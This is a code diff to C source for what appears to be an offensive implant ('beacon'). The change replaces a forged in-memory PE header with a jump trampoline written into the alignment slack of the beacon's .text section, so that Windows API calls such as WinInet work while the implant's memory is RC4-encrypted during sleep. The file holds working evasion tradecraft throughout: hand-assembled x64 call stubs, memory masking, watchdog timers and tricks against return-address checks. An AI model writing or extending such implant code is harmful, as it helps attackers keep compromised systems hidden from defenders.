@@ -148,20 +148,22 @@ typedef char bw_assert_call_args[offsetof(BW_CTX, call_args) == 0xAB0 ? 1 : -1];
 volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */
 int g_bw_dbg_before, g_bw_dbg_after;  /* test hook: block count before/after the keep-plaintext filter */
 
-/* The stubs live on the second page of a private two-page allocation. The
- * first page carries a minimal PE header, so that RtlPcToFileHeader - and
- * with it GetModuleHandleEx(FROM_ADDRESS) - resolves a return address from
- * the stub page to "a module", exactly as it does for a return address
- * inside the beacon image. WinInet asks the shim engine (apphelp.dll, in
- * every process without a manifest - our own-exe template) for its
- * caller's module by walking the stack to the first non-system frame;
- * given nothing it aborts and InternetOpenA hands back a bogus handle
- * (0xcc0010, live 2026-11-24). The header says nothing but the layout. */
-#define BW_STUB_HEADER 0x1000
-#define BW_STUB_BYTES  0x2000
+static unsigned char * g_bw_stubs;   /* private RX page: enter/exit/watchdog */
 
-static unsigned char * g_bw_stubs;   /* allocation base: [PE header][stubs] */
-static unsigned char * g_bw_code;    /* the RX stub page: enter/exit/watchdog/call */
+/* Where a gated call returns to. A callee may look its caller up by that
+ * address: WinInet asks GetModuleHandleEx(FROM_ADDRESS) for it, and on
+ * current Windows RtlPcToFileHeader behind that only resolves image
+ * mappings (MEM_IMAGE) - private memory resolves to nothing, with or
+ * without a PE header, and InternetOpenA then hands back a bogus handle
+ * (masked comms round, 2026-11-24). So the call thunk returns into the
+ * beacon image itself: the alignment slack behind .text (zero, executable,
+ * used by nothing) holds a `jmp qword ptr [rip+0]` back to the stub, and
+ * stays out of the mask. Without a usable slack the thunk returns to the
+ * stub page, which every API but that lookup takes fine. */
+#define BW_TRAMP_SIZE 14            /* FF 25 00 00 00 00 + qword */
+static unsigned char * g_bw_after;  /* stub page: where the trampoline jumps to */
+static unsigned char * g_bw_tramp;  /* the slack behind .text, or NULL */
+static int             g_bw_tramp_state; /* 0 = not looked for, 1 = ready, 2 = none */
 static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 
 #define BW_STATE_IDLE   0
@@ -176,6 +178,7 @@ static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */
 #define BW_SB1Q_OFF  0x1C0   /* qword: ctx->sbox1 address */
 #define BW_RC4_OFF   0x1C8   /* page-local RC4 PRGA (see below) */
 #define BW_CALL_OFF  0x210   /* call thunk: one Win32 call inside the window */
+#define BW_TRAMPQ_OFF 0x2A0  /* qword: the return trampoline in the beacon image, or 0 */
 
 /* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
  * round-tripping a block under a DIFFERENT counter would corrupt it. */
@@ -540,34 +543,6 @@ static int bw_emit_refresh(unsigned char * e, long d0, long d1)
 	return n;
 }
 
-/* the minimal PE header on the allocation's first page: MZ -> PE, one
- * executable section covering the stub page, SizeOfImage = the allocation -
- * what RtlPcToFileHeader checks when it walks back from an address */
-static void bw_put_pe_header(unsigned char * base)
-{
-	IMAGE_DOS_HEADER *    dos = (IMAGE_DOS_HEADER *)base;
-	IMAGE_NT_HEADERS64 *  nt  = (IMAGE_NT_HEADERS64 *)(base + 0x40);
-	IMAGE_SECTION_HEADER * sec = (IMAGE_SECTION_HEADER *)(nt + 1);
-
-	nt->Signature = IMAGE_NT_SIGNATURE;
-	nt->FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64;
-	nt->FileHeader.NumberOfSections = 1;
-	nt->FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
-	nt->FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_DLL;
-	nt->OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
-	nt->OptionalHeader.SectionAlignment = 0x1000;
-	nt->OptionalHeader.FileAlignment = 0x200;
-	nt->OptionalHeader.SizeOfImage = BW_STUB_BYTES;
-	nt->OptionalHeader.SizeOfHeaders = BW_STUB_HEADER;
-	memcpy(sec->Name, ".text", 6);
-	sec->Misc.VirtualSize = BW_STUB_HEADER;
-	sec->VirtualAddress = BW_STUB_HEADER;
-	sec->SizeOfRawData = BW_STUB_HEADER;
-	sec->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
-	dos->e_magic = IMAGE_DOS_SIGNATURE; /* last: the walk stops on MZ */
-	dos->e_lfanew = 0x40;
-}
-
 static BOOL bw_build_pages(void)
 {
 	DWORD old = 0;
@@ -578,14 +553,12 @@ static BOOL bw_build_pages(void)
 		return TRUE;
 
 	g_bw_ctx = (BW_CTX *)VirtualAlloc(NULL, sizeof(BW_CTX), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-	g_bw_stubs = (unsigned char *)VirtualAlloc(NULL, BW_STUB_BYTES, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	g_bw_stubs = (unsigned char *)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 	if (g_bw_ctx == NULL || g_bw_stubs == NULL)
 		return FALSE;
 	memset(g_bw_ctx, 0, sizeof(BW_CTX));
-	memset(g_bw_stubs, 0, BW_STUB_BYTES);
-	bw_put_pe_header(g_bw_stubs);
-	g_bw_code = g_bw_stubs + BW_STUB_HEADER;
-	p = g_bw_code;
+	memset(g_bw_stubs, 0, 0x1000);
+	p = g_bw_stubs;
 #define BW_BUILD_FAIL() do { 	VirtualFree(g_bw_ctx, 0, MEM_RELEASE);  g_bw_ctx = NULL; 	VirtualFree(g_bw_stubs, 0, MEM_RELEASE); g_bw_stubs = NULL; 	return FALSE; } while (0)
 
 	/* ---- enter_stub (called from C, rsp%16==8, [rsp]=ret_to_C) ----
@@ -781,6 +754,9 @@ static BOOL bw_build_pages(void)
 	}
 
 	/* ---- call thunk at BW_CALL_OFF (bofwin_call: BeaconGate's bMask) ----
+	 * The return address it pushes is the trampoline in the beacon image
+	 * when one was placed (BW_TRAMPQ_OFF != 0), else `after` on this page -
+	 * see g_bw_tramp above.
 	 * enter_stub jumps here exactly where a BOF would be: rcx = ctx->args,
 	 * which for a call window is the record {fn, ret, args[10]} on the ctx
 	 * page (args[i] at +0x10 + 8*i); entry rsp%16==8, [rsp]=exit_stub.
@@ -821,9 +797,14 @@ static BOOL bw_build_pages(void)
 		e[15] = 0xFF; e[16] = 0x70; e[17] = 0x30;                      /* push [rax+0x30] a4 */
 		e[18] = 0x48; e[19] = 0x83; e[20] = 0xEC; e[21] = 0x20;        /* sub rsp,0x20 shadow */
 		e += 22;
-		e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x15;                         /* lea r10,[rip+d32] after */
-		lea_at = (int)(e - p);
-		e = bw_put32(e + 3, 0);                                         /* patched below */
+		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x15;                         /* mov r10,[rip+d32] tramp */
+		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_TRAMPQ_OFF));
+		e[0] = 0x4D; e[1] = 0x85; e[2] = 0xD2;                         /* test r10,r10 */
+		e[3] = 0x75; e[4] = 0x07;                                       /* jnz -> push */
+		e[5] = 0x4C; e[6] = 0x8D; e[7] = 0x15;                         /* lea r10,[rip+d32] after */
+		lea_at = (int)(e - p) + 5;
+		e = bw_put32(e + 8, 0);                                         /* patched below */
+		e += 12;
 		e[0] = 0x41; e[1] = 0x52;                                       /* push r10 */
 		e[2] = 0x41; e[3] = 0xFF; e[4] = 0xE3;                         /* jmp r11 */
 		e += 5;
@@ -836,6 +817,8 @@ static BOOL bw_build_pages(void)
 		bw_put32(p + lea_at + 3, bw_disp(lea_at + 7, after_at));
 		if ((int)(e - (p + BW_CALL_OFF)) > 0x80)
 			BW_BUILD_FAIL();
+		bw_put64(p + BW_TRAMPQ_OFF, 0); /* no trampoline until one is placed */
+		g_bw_after = p + after_at;
 	}
 
 	/* the page-local PRGA + the qwords all stubs load rip-relatively */
@@ -844,9 +827,9 @@ static BOOL bw_build_pages(void)
 	bw_put64(p + BW_SB0Q_OFF, (unsigned long long)(size_t)g_bw_ctx->sbox0);
 	bw_put64(p + BW_SB1Q_OFF, (unsigned long long)(size_t)g_bw_ctx->sbox1);
 
-	if (!VirtualProtect(g_bw_stubs, BW_STUB_BYTES, PAGE_EXECUTE_READ, &old))
+	if (!VirtualProtect(p, 0x1000, PAGE_EXECUTE_READ, &old))
 		BW_BUILD_FAIL();
-	FlushInstructionCache(GetCurrentProcess(), g_bw_stubs, BW_STUB_BYTES);
+	FlushInstructionCache(GetCurrentProcess(), p, 0x1000);
 #undef BW_BUILD_FAIL
 	return TRUE;
 }
@@ -858,18 +841,18 @@ BOOL bofwin_supported(void)
 
 void * bofwin_test_stub_page(void)
 {
-	return g_bw_code; /* NULL before the first bw_build_pages */
-}
-
-void * bofwin_test_base(void)
-{
-	return g_bw_stubs; /* the allocation base = the PE header page */
+	return g_bw_stubs; /* NULL before the first bw_build_pages */
 }
 
 void bofwin_test_blocks(int * before, int * after)
 {
 	*before = g_bw_dbg_before;
 	*after = g_bw_dbg_after;
+}
+
+void * bofwin_test_tramp(void)
+{
+	return g_bw_tramp; /* the return trampoline in the image, or NULL */
 }
 
 int bofwin_test_phase(void)
@@ -921,6 +904,78 @@ static int bw_keep_plaintext(BW_BLOCK * blocks, int n, int * text_idx, const uns
 	return w;
 }
 
+/* Place the return trampoline in the alignment slack behind .text: only
+ * when the slack is at least BW_TRAMP_SIZE long and all zero (nothing of
+ * ours lives there). The image must be in the clear here. TRUE once the
+ * trampoline is available (looked for once per process). */
+static BOOL bw_make_tramp(unsigned char * text, unsigned long len)
+{
+	unsigned char * base = (unsigned char *)gparms->beacon_ptr;
+	IMAGE_DOS_HEADER *    dos = (IMAGE_DOS_HEADER *)base;
+	IMAGE_NT_HEADERS *    nt;
+	IMAGE_SECTION_HEADER * sec;
+	unsigned char * end;
+	unsigned char * page;
+	SIZE_T vsize = 0;
+	SIZE_T slack;
+	SIZE_T i;
+	DWORD old = 0, back = 0;
+	int k;
+
+	if (g_bw_tramp_state != 0)
+		return g_bw_tramp_state == 1;
+	g_bw_tramp_state = 2;
+	if (g_bw_stubs == NULL || base == NULL)
+		return FALSE;
+
+	/* .text's virtual size from the image itself (the snapshot may hand
+	 * out a rounded span) */
+	nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
+	sec = IMAGE_FIRST_SECTION(nt);
+	for (k = 0; k < nt->FileHeader.NumberOfSections; k++, sec++) {
+		if (base + sec->VirtualAddress == text) {
+			vsize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
+			break;
+		}
+	}
+	if (vsize == 0 || vsize > len)
+		vsize = len;
+	end  = text + vsize;
+	page = (unsigned char *)((unsigned long long)end & ~(unsigned long long)0xFFF);
+	slack = (SIZE_T)(page + 0x1000 - end);
+	if (slack < BW_TRAMP_SIZE)
+		return FALSE;
+	for (i = 0; i < BW_TRAMP_SIZE; i++) {
+		if (end[i] != 0)
+			return FALSE; /* something lives in the slack */
+	}
+
+	if (!VirtualProtect(page, 0x1000, PAGE_EXECUTE_READWRITE, &old))
+		return FALSE;
+	end[0] = 0xFF;                                /* jmp */
+	end[1] = 0x25;                                /* qword ptr [rip+0] */
+	end[2] = 0; end[3] = 0; end[4] = 0; end[5] = 0;
+	memcpy(end + 6, &g_bw_after, sizeof(g_bw_after));
+	FlushInstructionCache(GetCurrentProcess(), end, BW_TRAMP_SIZE);
+	VirtualProtect(page, 0x1000, old, &back);
+
+	/* hand the address to the call thunk (the stub page is RX) */
+	if (!VirtualProtect(g_bw_stubs, 0x1000, PAGE_READWRITE, &old)) {
+		memset(end, 0, BW_TRAMP_SIZE);
+		return FALSE;
+	}
+	{
+		unsigned long long where = (unsigned long long)(size_t)end;
+		memcpy(g_bw_stubs + BW_TRAMPQ_OFF, &where, sizeof(where));
+	}
+	VirtualProtect(g_bw_stubs, 0x1000, PAGE_EXECUTE_READ, &back);
+	FlushInstructionCache(GetCurrentProcess(), g_bw_stubs, 0x1000);
+
+	g_bw_tramp = end;
+	g_bw_tramp_state = 1;
+	return TRUE;
+}
+
 static BOOL bw_window(const BW_TARGET * t)
 {
 	BW_SF032 fn;
@@ -967,6 +1022,10 @@ static BOOL bw_window(const BW_TARGET * t)
 		g_bw_dbg_after = nblocks;
 		if (nblocks < 1 || text_idx < 0)
 			return FALSE;
+		/* the call thunk returns through the beacon image: the slack
+		 * behind .text keeps the trampoline and stays in the clear */
+		if (bw_make_tramp(blocks[text_idx].ptr, blocks[text_idx].len))
+			blocks[text_idx].len = (unsigned long)(g_bw_tramp - blocks[text_idx].ptr);
 	}
 	if (crypto_rng_get_bytes(key, (unsigned long)sizeof(key)) == 0)
 		return FALSE;
@@ -977,7 +1036,7 @@ static BOOL bw_window(const BW_TARGET * t)
 		pDelTimer = (BOOL (WINAPI *)(void *, void *, void *))(void *)DeleteTimerQueueTimer;
 		/* capture the stub address NOW - g_bw_stubs lives in .data and is
 		 * ciphertext after the mask loop. */
-		enter_fn = (void (*)(void))(g_bw_code + BW_ENTER_OFF);
+		enter_fn = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
 
 	ctx->state = BW_STATE_OPEN;
 	ctx->rest_done = 0;
@@ -1029,7 +1088,7 @@ static BOOL bw_window(const BW_TARGET * t)
 		if (watchdog < 50)
 			watchdog = (watchdog == 0) ? BW_DEFAULT_WATCHDOG_MS : 50;
 		if (!CreateTimerQueueTimer(&timer, NULL,
-		                           (WAITORTIMERCALLBACK)(void *)(g_bw_code + BW_WATCH_OFF),
+		                           (WAITORTIMERCALLBACK)(void *)(g_bw_stubs + BW_WATCH_OFF),
 		                           NULL, watchdog, 0,
 		                           WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION)) {
 			if (args_copy != NULL)
@@ -1153,7 +1212,7 @@ BOOL bofwin_call(void * fn, const unsigned long long * args, int nargs, unsigned
 	ctx->call_ret = 0;
 
 	memset(&t, 0, sizeof(t));
-	t.entry = (void (*)(void *, int))(g_bw_code + BW_CALL_OFF);
+	t.entry = (void (*)(void *, int))(g_bw_stubs + BW_CALL_OFF);
 	t.args = &ctx->call_fn;
 	t.image_only = TRUE;
 	t.avoid = ctx->call_args;
@@ -1177,15 +1236,15 @@ void * bofwin_test_stub_page(void)
 	return NULL;
 }
 
-void * bofwin_test_base(void)
-{
-	return NULL;
-}
-
 void bofwin_test_blocks(int * before, int * after)
 {
 	*before = 0;
 	*after = 0;
+}
+
+void * bofwin_test_tramp(void)
+{
+	return NULL;
 }
 
 int bofwin_test_phase(void)
